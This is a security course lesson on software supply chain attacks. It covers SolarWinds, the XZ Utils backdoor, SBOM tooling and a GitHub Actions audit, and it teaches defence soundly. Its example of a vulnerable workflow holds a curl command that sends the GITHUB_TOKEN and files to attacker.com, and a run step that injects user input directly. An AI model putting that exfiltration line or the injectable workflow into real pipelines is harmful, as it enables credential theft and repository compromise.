---
title: "Day 737 — Advanced Supply Chain Security"
tags: [supply-chain, sbom, sca, typosquatting, ci-cd, github-actions,
  dependency-confusion, solarwinds, module-12-post-gate]
module: 12-PostGate
day: 737
prerequisites:
  - Day 736 — AI and ML Security
  - Day 678–679 — Dependency Confusion and Supply Chain Attack Lab
related_topics:
  - Day 738 — Building a Threat Intelligence Programme
---

# Day 737 — Advanced Supply Chain Security

> "The SolarWinds attack changed the calculus. Until December 2020, most
> organisations trusted software that passed their internal review. After
> SolarWinds: you have to assume that the software you trust most — the
> build systems, the deployment pipelines, the signed packages — is exactly
> what a sophisticated attacker will target. The supply chain is the attack
> surface that defenders built themselves."
>
> — Ghost

---

## Goals

1. Understand the SolarWinds SUNBURST attack at the technical level: how the
   build pipeline was compromised and how the backdoor evaded detection.
2. Map the software supply chain attack surface: source → build → package →
   deploy → runtime.
3. Implement a full Software Bill of Materials (SBOM) workflow and explain
   its security value.
4. Audit a GitHub Actions CI/CD pipeline for common security misconfigurations.
5. Understand the XZ Utils backdoor (CVE-2024-3094) as a modern supply chain attack.

---

## Prerequisites

- Days 678–679 (dependency confusion, supply chain basics).
- Basic GitHub Actions and CI/CD familiarity.

---

## 1 — The Software Supply Chain Attack Surface

```
SOFTWARE SUPPLY CHAIN — ATTACK SURFACE MAP

SOURCE CODE:
  Developer workstation compromise → malicious commit
  Upstream dependency poisoning → attack lands in your node_modules
  CI/CD credential theft → attacker pushes code via stolen token

BUILD SYSTEM:
  Build server compromise → inject malware into build artefacts
  Build tool compromise (make, gradle, cargo) → tool itself is malicious
  Compiler backdoor: the Ken Thompson attack (1984 Turing Lecture) — still valid

PACKAGE REGISTRY:
  Typosquatting: "reqeusts" instead of "requests" → malicious package
  Account takeover: steal a maintainer's credentials → push malicious update
  Dependency confusion: internal package name squatted on public registry

DISTRIBUTION:
  CDN compromise: replace legitimate CDN-hosted JS library with malicious version
  Software update mechanism: MITM or server compromise to deliver malicious updates
  Signed package with compromised signing key (SolarWinds model)

RUNTIME:
  Malicious package executes at install time (postinstall scripts)
  Malicious package executes at import time (side effects in __init__.py)
  Supply chain establishes persistence via the installed software
```

---

## 2 — SolarWinds SUNBURST: Technical Analysis

```
SOLARWINDS SUNBURST ATTACK — TECHNICAL BREAKDOWN (2020)

ATTACKER: COZY BEAR (APT29) — Russian SVR
DISCOVERY: December 2020 by FireEye (during their own breach investigation)
VICTIMS: 18,000 organisations received the trojanised update;
         ~100 were selectively activated as targets

TIMELINE:
  Oct 2019: Initial SolarWinds network compromise
  Feb 2020: Test backdoor deployed (SUNSPOT) — modified build system
  Mar 2020: SUNBURST deployed in SolarWinds Orion updates
  Dec 2020: Discovery and disclosure

INFECTION MECHANISM (SUNSPOT):
  The attackers compromised the build server for SolarWinds Orion.
  They injected a process (SUNSPOT) that monitored for Orion build starts.
  When the Orion build began, SUNSPOT replaced a source file
  (SolarWinds.Orion.Core.BusinessLayer.dll) with the trojanised version
  before compilation. After compilation completed, it replaced the file back.
  → The build log showed no anomaly. The code review never saw the bad file.
  → The signed DLL contained the backdoor. The signature was valid (SolarWinds' key).

SUNBURST EVASION TECHNIQUES:
  1. 12–14 day dormancy: SUNBURST waited 12 days after install before activating
     → Avoided triggering anti-malware sandboxes that detonate for <10 min
  2. Domain generation: used legitimate CNAME records pointing to C2
     → C2 communications used SolarWinds' own Orion API protocol format
     → Traffic appeared as normal Orion telemetry
  3. Allowlist check: checked for presence of certain security products
     → If any of 100+ security tools were present, backdoor stayed dormant
  4. Build-in signed: the backdoor was part of the legitimate DLL,
     digitally signed by SolarWinds → code signing validation passed everywhere
```

---

## 3 — XZ Utils Backdoor: CVE-2024-3094

```
XZ UTILS BACKDOOR — CVE-2024-3094 (2024)

REPORTER: Andres Freund (Microsoft engineer, found by accident)
DISCLOSURE: 2024-03-29
AFFECTED: xz 5.6.0 and 5.6.1 — in Debian unstable, Fedora Rawhide
IMPACT: RCE on any host running vulnerable sshd (via liblzma) as root
        Attacker could authenticate to SSH without credentials

ATTACK VECTOR — SOCIAL ENGINEERING OF AN OPEN SOURCE MAINTAINER:
  2021–2024: A persona called "Jia Tan" (JiaT75) spent 2+ years contributing
  legitimate, high-quality patches to the xz-utils project.
  → Built trust with the single maintainer (Lasse Collin, who had mental health
    issues and was struggling to maintain the project)
  → Gradually gained write access
  → Added a backdoor in the build system (m4/build-to-host.m4)
  → The backdoor was in the distribution tarball (not the git repo directly)
    — it only activated on specific Linux systems during RPM/Debian packaging

TECHNICAL MECHANISM:
  The backdoor patched sshd's authentication code via liblzma
  (sshd links libsystemd which links liblzma on affected systems).
  The patch allowed authentication with a specific Ed448 private key
  held by the attacker — bypassing all other authentication.

DETECTION: Andres Freund noticed 500ms SSH latency increases and traced it
  to unusual CPU usage in liblzma → found the backdoor in 3 days

LESSONS:
  1. Open source social engineering works at multi-year timescales
  2. Build system / release tarball ≠ git repo — must diff both
  3. Single maintainers are a supply chain risk — contribute to projects
     you depend on
  4. Canary: monitor the performance of authentication-critical paths
     Unexplained latency in SSH can indicate malicious instrumentation
```

---

## 4 — SBOM: Software Bill of Materials

An SBOM is a machine-readable inventory of all software components in a product.

### 4.1 Generating an SBOM

```bash
# For Python projects (pyproject.toml / requirements.txt):
pip install cyclonedx-bom
cyclonedx-py environment -o sbom.json --format json

# For Node.js (package.json):
npm install -g @cyclonedx/cyclonedx-npm
cyclonedx-npm --output-file sbom.json --output-format JSON

# For Go (go.mod):
go install github.com/CycloneDX/cyclonedx-gomod/cmd/cyclonedx-gomod@latest
cyclonedx-gomod mod -output sbom.json

# For container images:
syft my-docker-image:latest -o cyclonedx-json > sbom.json

# SPDX format alternative (used by Linux Foundation):
sbom-tool generate -b . -bc . -pn "MyApp" -pv "1.0" -ps "MyOrg" -V Verbose

# Scan SBOM for known CVEs:
grype sbom:sbom.json
# Output: each component checked against NVD + GitHub Advisory Database
```

### 4.2 SBOM Security Workflow

```
SBOM SECURITY WORKFLOW

1. GENERATE at build time:
   CI/CD pipeline generates SBOM → stored with build artefact

2. SIGN the SBOM:
   cosign sign-blob sbom.json --output-signature sbom.json.sig

3. SCAN against vulnerability databases:
   grype sbom.json --fail-on high
   # Fail the build if any HIGH severity CVE found in dependencies

4. MONITOR continuously:
   Subscribe to CVE feeds for components in your SBOM
   When a new CVE appears in a component you use: alert + prioritise patch

5. AUDIT provenance:
   SLSA (Supply-chain Levels for Software Artefacts) framework
   Levels 1–4 define increasing guarantees about build provenance
   Level 3: build is reproducible; provenance is signed by the build system
```

---

## 5 — GitHub Actions Security Audit

CI/CD pipelines are frequently misconfigured:

```yaml
# VULNERABLE GitHub Actions workflow
name: CI
on:
  pull_request_target:  # ← DANGEROUS: runs with write permission on PR from fork
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: write  # ← unnecessary write permission
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← checks out untrusted code

      # CRITICAL VULNERABILITY: executes untrusted PR code with elevated permissions
      - name: Run tests
        run: ${{ github.event.inputs.command }}  # ← direct injection from input

      # SECRET EXPOSURE: GITHUB_TOKEN with write access → malicious PR can steal it
      - name: Upload artifact
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}  # exposed to untrusted code
        run: |
          curl -H "Authorization: token $TOKEN" \
               -F data=@output.tar https://attacker.com/steal
```

```yaml
# HARDENED version
name: CI
on:
  pull_request:  # ← read-only for fork PRs
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read    # ← minimal permissions
      id-token: write   # ← only if OIDC is needed
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # pin by hash, not tag
        # NEVER: uses: actions/checkout@v3  ← tag can be overwritten

      - name: Run tests
        run: npm test    # ← fixed command, not user-controlled

      # Never expose secrets to steps that run untrusted code
```

---

## Key Takeaways

1. **SolarWinds proved that the build pipeline is an attack vector.** Code
   signing does not mean the code is safe — it means the build system signed
   it. If the build system is compromised, all signatures are meaningless.
   Build pipeline integrity is now a first-class security control.
2. **XZ Utils proved that open source social engineering is viable at
   multi-year timescales.** The attacker spent two years building trust.
   The detection was accidental (latency monitoring). Single-maintainer open
   source projects are supply chain risks — and we depend on thousands of them.
3. **SBOM is a foundational tool, not a solution.** An SBOM tells you what
   is in your software. It does not prevent a malicious package from entering.
   Combine it with: verified provenance (SLSA), vulnerability scanning (Grype),
   runtime behavioural monitoring, and developer workstation security.
4. **GitHub Actions `pull_request_target` is the most common CI/CD
   misconfiguration in production.** It grants write permissions to untrusted
   code from external PRs. Any public repository using it incorrectly is
   vulnerable to credential theft and repository compromise.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q737.1, Q737.2 …).

---

## Navigation

← Previous: [Day 736 — AI and ML Security](DAY-0736-AI-ML-Security.md)
→ Next: [Day 738 — Building a Threat Intelligence Programme](DAY-0738-Threat-Intelligence-Programme.md)
